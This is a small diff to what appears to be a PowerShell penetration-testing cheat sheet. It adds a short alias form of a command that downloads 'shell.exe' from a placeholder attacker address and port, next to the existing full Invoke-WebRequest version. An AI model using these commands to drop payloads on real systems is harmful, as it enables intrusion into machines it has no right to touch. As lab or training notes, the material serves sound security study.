@@ -27,6 +27,11 @@ Now a man-page like output should help discovering how to use it.
 ```
 Invoke-WebRequest -Uri "http://${ATTACK_IP}:${PORT}/shell.exe" -OutFile "shell.exe"
 ```
+or
+
+```
+iwr -uri "http://${ATTACK_IP}:${PORT}/shell.exe" -OutFile "shell.exe"
+```
 
 ## Useful commands cmdlets for searching and enumerating
 
